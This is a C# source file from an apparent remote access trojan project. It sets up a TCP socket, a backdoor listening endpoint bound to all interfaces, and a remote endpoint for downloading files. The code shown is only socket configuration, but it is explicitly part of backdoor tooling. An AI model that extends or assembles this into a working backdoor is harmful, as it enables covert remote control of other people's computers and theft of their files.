using RAT.Configuration;
using RAT.Interfaces;
using System.Net;
using System.Net.Sockets;

namespace RAT.Configurations
{
    /// <summary>
    /// Socket configuration logic.
    /// </summary>
    public class SocketConfigurationLogic : ISocketConfigurationLogic
    {
        /// <summary>
        /// Our static configuration.
        /// </summary>
        private BackdoorConfiguration _backdoorConfiguration { get; }

        /// <summary>
        /// Socket configuration logic.
        /// </summary>
        public SocketConfigurationLogic()
        {
            _backdoorConfiguration = new BackdoorConfigurationLogic().GetBackdoorConfiguration();
        }

        /// <summary>
        /// Gets fully configured and "ready-to-use" socket.
        /// </summary>
        /// <returns>Configured socket.</returns>
        public Socket GetConfiguredSocket()
        {
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        /// <summary>
        /// Gets configuration for local endpoint which later can be used with socket configuration.
        /// </summary>
        /// <returns><see cref="IPEndPoint"/> class which holds all needed information about local endpoint.</returns>
        public IPEndPoint GetLocalEndpointConfigurationForStandartSocket()
        {
            return new IPEndPoint(IPAddress.Any, _backdoorConfiguration.ConnectionPort);
        }

        /// <summary>
        /// Gets configuration for remote endpoint which later can be used with socket configuration for file download.
        /// </summary>
        /// <param name="ipAddress">Ip address of remote endpoint.</param>
        /// <returns><see cref="IPEndPoint"/> class which holds all needed information about local endpoint.</returns>
        public IPEndPoint GetRemoteEndpointConfigurationForFileDownloadSocket(IPAddress ipAddress)
        {
            return new IPEndPoint(ipAddress, _backdoorConfiguration.FileDownloadPort);
        }
    }
}